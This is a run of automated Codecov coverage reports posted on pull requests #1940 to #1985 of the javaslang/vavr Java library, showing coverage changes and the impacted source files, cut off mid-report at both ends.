749         \n  Branches         76      76         \n========================================\n  Hits            749     749\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 3560d90...3eca088. Read the comment docs.. # Codecov Report\nMerging #1940 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff            @@\nmaster   #1940   +/-\n========================================\n  Coverage       100%    100%         \n  Complexity      132     132         \n========================================\n  Files             5       5         \n  Lines           749     749         \n  Branches         76      76         \n========================================\n  Hits            749     749\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 3560d90...e9d8bba. Read the comment docs.. # Codecov Report\nMerging #1944 into master will decrease coverage by 1.95%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1944      +/-\n============================================\n- Coverage       100%   98.04%   -1.96%   \n- Complexity      132     5112    +4980   \n============================================\n  Files             5       89      +84   \n  Lines           749    11577   +10828   \n  Branches         76     1523    +1447   \n============================================\n+ Hits            749    11351   +10602   \n- Misses            0      108     +108   \n- Partials          0      118     +118\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...rc/main/java/javaslang/collection/Traversable.java | 96.82% <100%> (\u00f8) | 112 <0> (?) | |\n| ...lang/src/main/java/javaslang/collection/Array.java | 99.53% <0%> (\u00f8) | 241% <0%> (?) | |\n| javaslang/src/main/java/javaslang/MatchError.java | 75% <0%> (\u00f8) | 2% <0%> (?) | |\n| ...ang/src/main/java/javaslang/collection/BitSet.java | 99.42% <0%> (\u00f8) | 79% <0%> (?) | |\n| javaslang/src-gen/main/java/javaslang/Tuple1.java | 100% <0%> (\u00f8) | 19% <0%> (?) | |\n| .../main/java/javaslang/collection/BitMappedTrie.java | 100% <0%> (\u00f8) | 72% <0%> (?) | |\n| .../main/java/javaslang/collection/LinkedHashSet.java | 96.66% <0%> (\u00f8) | 143% <0%> (?) | |\n| ...c/main/java/javaslang/collection/HashMultimap.java | 94.73% <0%> (\u00f8) | 8% <0%> (?) | |\n| ...aslang/src/main/java/javaslang/collection/Seq.java | 95.08% <0%> (\u00f8) | 51% <0%> (?) | |\n| ...in/java/javaslang/collection/AbstractMultimap.java | 95.55% <0%> (\u00f8) | 123% <0%> (?) | |\n| ... and 75 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 51cb15c...1a30129. Read the comment docs.. # Codecov Report\nMerging #1946 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1946      +/-\n============================================\n+ Coverage     98.04%   98.04%   +<.01%   \n- Complexity     5112     5116       +4   \n============================================\n  Files            89       89            \n  Lines         11577    11585       +8   \n  Branches       1523     1523            \n============================================\n+ Hits          11351    11359       +8   \n  Misses          108      108            \n  Partials        118      118\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...ang/src/main/java/javaslang/concurrent/Future.java | 99.55% <100%> (\u00f8) | 112 <2> (+2) | :arrow_up: |\n| javaslang/src/main/java/javaslang/control/Try.java | 95.04% <100%> (+0.03%) | 90 <1> (+1) | :arrow_up: |\n| ...aslang/src/main/java/javaslang/control/Option.java | 100% <100%> (\u00f8) | 43 <1> (+1) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 85d7373...969c778. Read the comment docs.\n. # Codecov Report\nMerging #1948 into master will decrease coverage by 0.02%.\nThe diff coverage is 89.9%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1948      +/-\n============================================\n- Coverage     98.04%   98.02%   -0.03%   \n- Complexity     5116     5119       +3   \n============================================\n  Files            89       89            \n  Lines         11585    11551      -34   \n  Branches       1523     1508      -15   \n============================================\n- Hits          11359    11323      -36   \n  Misses          108      108            \n- Partials        118      120       +2\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...rc/main/java/javaslang/collection/Traversable.java | 96.82% <\u00f8> (\u00f8) | 112 <0> (\u00f8) | :arrow_down: |\n| ...g/src/main/java/javaslang/collection/Iterator.java | 99.33% <\u00f8> (\u00f8) | 171 <0> (\u00f8) | :arrow_down: |\n| .../main/java/javaslang/collection/AbstractQueue.java | 100% <\u00f8> (\u00f8) | 21 <0> (-1) | :arrow_down: |\n| ...c/main/java/javaslang/collection/RedBlackTree.java | 91.35% <0%> (-0.58%) | 28 <0> (\u00f8) | |\n| ...ng/src/main/java/javaslang/collection/HashSet.java | 95.74% <100%> (-0.09%) | 136 <2> (-2) | |\n| ...ang/src/main/java/javaslang/collection/Stream.java | 98.56% <100%> (-0.04%) | 254 <0> (\u00f8) | |\n| ...ng/src/main/java/javaslang/collection/CharSeq.java | 99.81% <100%> (-0.01%) | 341 <2> (-2) | |\n| ...lang/src/main/java/javaslang/collection/Queue.java | 95.95% <100%> (+0.01%) | 192 <2> (-2) | :arrow_down: |\n| ...ang/src/main/java/javaslang/collection/Vector.java | 99.68% <100%> (\u00f8) | 206 <2> (-3) | :arrow_down: |\n| .../main/java/javaslang/collection/LinkedHashMap.java | 98.51% <100%> (+0.93%) | 127 <2> (-1) | :arrow_down: |\n| ... and 13 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update cc8981b...8153cd2. Read the comment docs.\n. # Codecov Report\nMerging #1950 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1950   +/-\n=========================================\n  Coverage     98.02%   98.02%         \n  Complexity     5119     5119         \n=========================================\n  Files            89       89         \n  Lines         11551    11551         \n  Branches       1508     1508         \n=========================================\n  Hits          11323    11323         \n  Misses          108      108         \n  Partials        120      120\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update b07326d...0947f7f. Read the comment docs.\n. # Codecov Report\nMerging #1951 into master will increase coverage by 0.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1951      +/-\n============================================\n+ Coverage     98.02%   98.04%   +0.01%   \n- Complexity     5119     5120       +1   \n============================================\n  Files            89       89            \n  Lines         11551    11551            \n  Branches       1508     1508            \n============================================\n+ Hits          11323    11325       +2   \n+ Misses          108      107       -1   \n+ Partials        120      119       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 86.07% <0%> (+2.53%) | 22% <0%> (+1%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update b07326d...b88d7dd. Read the comment docs.\n. # Codecov Report\nMerging #1952 into master will decrease coverage by 0.07%.\nThe diff coverage is 91.9%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1952      +/-\n============================================\n- Coverage     97.97%   97.89%   -0.08%   \n- Complexity     5121     5156      +35   \n============================================\n  Files            89       90       +1   \n  Lines         11600    11802     +202   \n  Branches       1515     1540      +25   \n============================================\n+ Hits          11365    11554     +189   \n- Misses          112      125      +13   \n  Partials        123      123\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...vr/src/main/java/io/vavr/collection/LinearSeq.java | 100% <\u00f8> (\u00f8) | 16 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Seq.java | 95.08% <\u00f8> (\u00f8) | 51 <0> (\u00f8) | :arrow_down: |\n| ...r/src/main/java/io/vavr/collection/IndexedSeq.java | 100% <\u00f8> (\u00f8) | 33 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/List.java | 99.61% <100%> (\u00f8) | 259 <4> (+4) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/Vector.java | 99.68% <100%> (\u00f8) | 207 <4> (+4) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/Stream.java | 98.98% <100%> (+0.41%) | 259 <4> (+5) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/Array.java | 99.53% <100%> (\u00f8) | 240 <4> (+4) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/CharSeq.java | 99.81% <100%> (\u00f8) | 349 <4> (+5) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/Queue.java | 96.66% <100%> (+0.72%) | 195 <4> (+6) | :arrow_up: |\n| .../src/main/java/io/vavr/collection/Collections.java | 93.81% <85.71%> (-0.31%) | 105 <6> (+6) | |\n| ... and 3 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update b09a66b...1a4d662. Read the comment docs.\n. # Codecov Report\nMerging #1953 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1953   +/-\n=========================================\n  Coverage     98.02%   98.02%         \n  Complexity     5119     5119         \n=========================================\n  Files            89       89         \n  Lines         11551    11551         \n  Branches       1508     1508         \n=========================================\n  Hits          11323    11323         \n  Misses          108      108         \n  Partials        120      120\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Try.java | 95.04% <\u00f8> (\u00f8) | 90 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Option.java | 100% <\u00f8> (\u00f8) | 43 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/concurrent/Future.java | 99.55% <\u00f8> (\u00f8) | 112 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update e49a2d7...39190ae. Read the comment docs.\n. # Codecov Report\nMerging #1954 into master will decrease coverage by 0.04%.\nThe diff coverage is 77.77%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1954      +/-\n============================================\n- Coverage     98.02%   97.97%   -0.05%   \n- Complexity     5119     5126       +7   \n============================================\n  Files            89       89            \n  Lines         11551    11578      +27   \n  Branches       1508     1514       +6   \n============================================\n+ Hits          11323    11344      +21   \n- Misses          108      111       +3   \n- Partials        120      123       +3\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/HashMap.java | 98.19% <71.42%> (-1.18%) | 123 <2> (+2) | |\n| vavr/src/main/java/io/vavr/collection/TreeMap.java | 96.65% <77.77%> (-0.74%) | 153 <3> (+3) | |\n| ...rc/main/java/io/vavr/collection/LinkedHashMap.java | 97.65% <81.81%> (-0.87%) | 129 <2> (+2) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 069a6ed...ab748ec. Read the comment docs.\n. # Codecov Report\nMerging #1955 into master will not change coverage.\nThe diff coverage is 100%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1955   +/-\n=========================================\n  Coverage     97.97%   97.97%         \n  Complexity     5126     5126         \n=========================================\n  Files            89       89         \n  Lines         11578    11578         \n  Branches       1514     1514         \n=========================================\n  Hits          11344    11344         \n  Misses          111      111         \n  Partials        123      123\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/CharSeq.java | 99.81% <100%> (\u00f8) | 341 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 7d21f69...13e10b1. Read the comment docs.\n. # Codecov Report\nMerging #1956 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1956      +/-\n============================================\n+ Coverage     97.97%   97.98%   +<.01%   \n- Complexity     5126     5129       +3   \n============================================\n  Files            89       89            \n  Lines         11578    11594      +16   \n  Branches       1514     1513       -1   \n============================================\n+ Hits          11344    11360      +16   \n  Misses          111      111            \n  Partials        123      123\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/CharSeq.java | 99.81% <100%> (\u00f8) | 344 <25> (+3) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 57daf7e...ccf5084. Read the comment docs.\n. # Codecov Report\nMerging #1957 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1957   +/-\n=========================================\n  Coverage     97.97%   97.97%         \n  Complexity     5126     5126         \n=========================================\n  Files            89       89         \n  Lines         11578    11578         \n  Branches       1514     1514         \n=========================================\n  Hits          11344    11344         \n  Misses          111      111         \n  Partials        123      123\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/List.java | 99.61% <\u00f8> (\u00f8) | 258 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 57daf7e...13ae4e2. Read the comment docs.\n. # Codecov Report\nMerging #1966 into master will decrease coverage by 0.02%.\nThe diff coverage is 66.66%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1966      +/-\n============================================\n- Coverage     97.99%   97.97%   -0.03%   \n+ Complexity     5122     5121       -1   \n============================================\n  Files            89       89            \n  Lines         11599    11600       +1   \n  Branches       1515     1515            \n============================================\n- Hits          11367    11365       -2   \n- Misses          110      112       +2   \n- Partials        122      123       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/Map.java | 97.95% <66.66%> (-2.05%) | 33 <2> (\u00f8) | |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 83.54% <0%> (-2.54%) | 21% <0%> (-1%) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 5e9bead...85d74ed. Read the comment docs.\n. # Codecov Report\nMerging #1970 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff             @@\nmaster   #1970      +/-\n===========================================\n+ Coverage     97.89%   97.9%   +<.01%   \n- Complexity     5156    5202      +46   \n===========================================\n  Files            90      90            \n  Lines         11802   11852      +50   \n  Branches       1540    1540            \n===========================================\n+ Hits          11554   11604      +50   \n  Misses          125     125            \n  Partials        123     123\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...src/main/java/io/vavr/collection/TreeMultimap.java | 89.88% <\u00f8> (\u00f8) | 10 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/Value.java | 92.79% <\u00f8> (\u00f8) | 145 <0> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/LinkedHashSet.java | 96.62% <100%> (+0.02%) | 143 <2> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/Lazy.java | 100% <100%> (\u00f8) | 34 <2> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/TreeMap.java | 96.68% <100%> (+0.02%) | 155 <2> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/control/Try.java | 95.08% <100%> (+0.03%) | 92 <2> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/Vector.java | 99.68% <100%> (\u00f8) | 209 <2> (+2) | :arrow_up: |\n| ...avr/src/main/java/io/vavr/collection/Iterator.java | 99.33% <100%> (\u00f8) | 173 <2> (+2) | :arrow_up: |\n| ...rc/main/java/io/vavr/collection/LinkedHashMap.java | 97.67% <100%> (+0.02%) | 131 <2> (+2) | :arrow_up: |\n| ...rc/main/java/io/vavr/collection/PriorityQueue.java | 98.67% <100%> (+0.01%) | 108 <2> (+2) | :arrow_up: |\n| ... and 15 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 9aab8d9...97273ad. Read the comment docs.\n. # Codecov Report\nMerging #1971 into master will not change coverage.\nThe diff coverage is 100%.\n\n\n```diff\n@@           Coverage Diff            @@\nmaster   #1971   +/-\n========================================\n  Coverage      97.9%   97.9%         \n  Complexity     5202    5202         \n========================================\n  Files            90      90         \n  Lines         11852   11852         \n  Branches       1540    1540         \n========================================\n  Hits          11604   11604         \n  Misses          125     125         \n  Partials        123     123\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...r/src/main/java/io/vavr/collection/IndexedSeq.java | 100% <\u00f8> (\u00f8) | 33 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Seq.java | 95.08% <\u00f8> (\u00f8) | 51 <0> (\u00f8) | :arrow_down: |\n| ...vr/src/main/java/io/vavr/collection/LinearSeq.java | 100% <\u00f8> (\u00f8) | 16 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Stream.java | 98.99% <100%> (\u00f8) | 261 <4> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/CharSeq.java | 99.82% <100%> (\u00f8) | 351 <4> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Vector.java | 99.68% <100%> (\u00f8) | 209 <4> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Array.java | 99.53% <100%> (\u00f8) | 242 <4> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Queue.java | 96.68% <100%> (\u00f8) | 197 <4> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/List.java | 99.61% <100%> (\u00f8) | 261 <4> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 14faad8...77f8738. Read the comment docs.\n. # Codecov Report\nMerging #1973 into master will decrease coverage by <.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff             @@\nmaster   #1973      +/-\n===========================================\n- Coverage      97.9%   97.9%   -0.01%   \n- Complexity     5202    5203       +1   \n===========================================\n  Files            90      91       +1   \n  Lines         11852   11860       +8   \n  Branches       1540    1541       +1   \n===========================================\n+ Hits          11604   11611       +7   \n- Misses          125     126       +1   \n  Partials        123     123\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src-gen/main/java/io/vavr/Function3.java | 100% <\u00f8> (\u00f8) | 11 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction0.java | 100% <\u00f8> (\u00f8) | 17 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction5.java | 100% <\u00f8> (\u00f8) | 15 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction8.java | 100% <\u00f8> (\u00f8) | 15 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Function5.java | 100% <\u00f8> (\u00f8) | 11 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction2.java | 100% <\u00f8> (\u00f8) | 16 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Function7.java | 100% <\u00f8> (\u00f8) | 11 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction1.java | 100% <\u00f8> (\u00f8) | 19 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/Lambda.java | 87.5% <\u00f8> (\u00f8) | 1 <0> (?) | |\n| vavr/src-gen/main/java/io/vavr/Function1.java | 100% <\u00f8> (\u00f8) | 15 <0> (\u00f8) | :arrow_down: |\n| ... and 10 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update cb99ea0...ebe6b86. Read the comment docs.\n. # Codecov Report\nMerging #1975 into master will not change coverage.\nThe diff coverage is 94.73%.\n\n\n```diff\n@@           Coverage Diff            @@\nmaster   #1975   +/-\n========================================\n  Coverage      97.9%   97.9%         \n- Complexity     5203    5204    +1   \n========================================\n  Files            91      92    +1   \n  Lines         11860   11860         \n  Branches       1541    1540    -1   \n========================================\n  Hits          11611   11611         \n  Misses          126     126         \n  Partials        123     123\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/Value.java | 92.79% <\u00f8> (\u00f8) | 145 <0> (\u00f8) | :arrow_down: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 83.54% <\u00f8> (\u00f8) | 21 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/API.java | 97.76% <\u00f8> (\u00f8) | 205 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/concurrent/Future.java | 99.55% <\u00f8> (\u00f8) | 114 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/CheckedPredicate.java | 0% <0%> (\u00f8) | 1 <1> (?) | |\n| vavr/src/main/java/io/vavr/control/Try.java | 95.39% <100%> (+0.31%) | 92 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update be5fbc1...1aae095. Read the comment docs.\n. # Codecov Report\nMerging #1976 into master will increase coverage by 0.03%.\nThe diff coverage is 95.78%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1976      +/-\n============================================\n+ Coverage      97.9%   97.93%   +0.03%   \n  Complexity     5204     5204            \n============================================\n  Files            92       92            \n  Lines         11860    11840      -20   \n  Branches       1540     1534       -6   \n============================================\n- Hits          11611    11595      -16   \n  Misses          126      126            \n+ Partials        123      119       -4\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Validation.java | 99.05% <\u00f8> (\u00f8) | 56 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Option.java | 100% <\u00f8> (\u00f8) | 45 <0> (\u00f8) | :arrow_down: |\n| .../src/main/java/io/vavr/collection/Traversable.java | 96.82% <\u00f8> (\u00f8) | 112 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/Lazy.java | 100% <\u00f8> (\u00f8) | 34 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Either.java | 100% <\u00f8> (\u00f8) | 40 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/concurrent/Future.java | 99.55% <100%> (\u00f8) | 114 <2> (\u00f8) | :arrow_down: |\n| ...-test/src-gen/main/java/io/vavr/test/Property.java | 100% <100%> (\u00f8) | 19 <3> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/Value.java | 93.54% <100%> (+0.75%) | 145 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Try.java | 95.81% <66.66%> (+0.42%) | 92 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update dfa1959...63713bc. Read the comment docs.\n. # Codecov Report\nMerging #1980 into master will decrease coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1980      +/-\n============================================\n- Coverage     97.93%   97.93%   -0.01%   \n+ Complexity     5204     5203       -1   \n============================================\n  Files            92       92            \n  Lines         11840    11837       -3   \n  Branches       1534     1534            \n============================================\n- Hits          11595    11592       -3   \n  Misses          126      126            \n  Partials        119      119\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 83.75% <100%> (+0.2%) | 22 <4> (+1) | :arrow_up: |\n| vavr/src/main/java/io/vavr/concurrent/Future.java | 99.55% <100%> (-0.01%) | 112 <2> (-2) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 425c5be...3d6a206. Read the comment docs.\n. # Codecov Report\nMerging #1982 into master will increase coverage by 0.08%.\nThe diff coverage is 92.2%.\n\n\n```diff\n@@             Coverage Diff             @@\nmaster   #1982      +/-\n===========================================\n+ Coverage     97.92%     98%   +0.08%   \n+ Complexity     5202    5174      -28   \n===========================================\n  Files            92      91       -1   \n  Lines         11837   11788      -49   \n  Branches       1534    1530       -4   \n===========================================\n- Hits          11591   11553      -38   \n+ Misses          126     116      -10   \n+ Partials        120     119       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/List.java | 99.61% <\u00f8> (-0.01%) | 260 <0> (-1) | |\n| vavr/src/main/java/io/vavr/control/Validation.java | 99.05% <\u00f8> (-0.01%) | 55 <0> (-1) | |\n| vavr/src/main/java/io/vavr/control/Option.java | 100% <\u00f8> (\u00f8) | 44 <0> (-1) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple8.java | 100% <\u00f8> (\u00f8) | 63 <0> (-1) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple3.java | 100% <\u00f8> (\u00f8) | 33 <0> (-1) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Tree.java | 97.8% <\u00f8> (\u00f8) | 116 <0> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/LinkedHashMap.java | 98.52% <\u00f8> (+0.85%) | 129 <0> (-2) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Seq.java | 98% <\u00f8> (+2.91%) | 50 <0> (-1) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple7.java | 100% <\u00f8> (\u00f8) | 57 <0> (-1) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/HashSet.java | 95.78% <\u00f8> (\u00f8) | 138 <0> (\u00f8) | :arrow_down: |\n| ... and 28 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 0473233...c2adfc8. Read the comment docs.\n. # Codecov Report\nMerging #1983 into master will decrease coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff             @@\nmaster   #1983      +/-\n===========================================\n- Coverage     98.01%     98%   -0.01%   \n+ Complexity     5175    5173       -2   \n===========================================\n  Files            91      91            \n  Lines         11788   11788            \n  Branches       1530    1530            \n===========================================\n- Hits          11554   11553       -1   \n  Misses          116     116            \n- Partials        118     119       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...rc/main/java/io/vavr/collection/LinkedHashMap.java | 98.52% <100%> (\u00f8) | 128 <4> (-1) | :arrow_down: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 82.5% <0%> (-1.25%) | 21% <0%> (-1%) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update b3a746d...b8475ee. Read the comment docs.\n. # Codecov Report\nMerging #1984 into master will decrease coverage by 0.23%.\nThe diff coverage is 71.84%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1984      +/-\n============================================\n- Coverage     98.01%   97.77%   -0.24%   \n+ Complexity     5175     5167       -8   \n============================================\n  Files            91       91            \n  Lines         11788    11797       +9   \n  Branches       1530     1565      +35   \n============================================\n- Hits          11554    11535      -19   \n  Misses          116      116            \n- Partials        118      146      +28\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/Seq.java | 98% <\u00f8> (\u00f8) | 50 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/API.java | 92.68% <71.84%> (-5.09%) | 197 <0> (-8) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update b3a746d...8a8c6d5. Read the comment docs.\n. # Codecov Report\nMerging #1985 into master will decrease coverage by 0.01%.\nThe diff coverage is 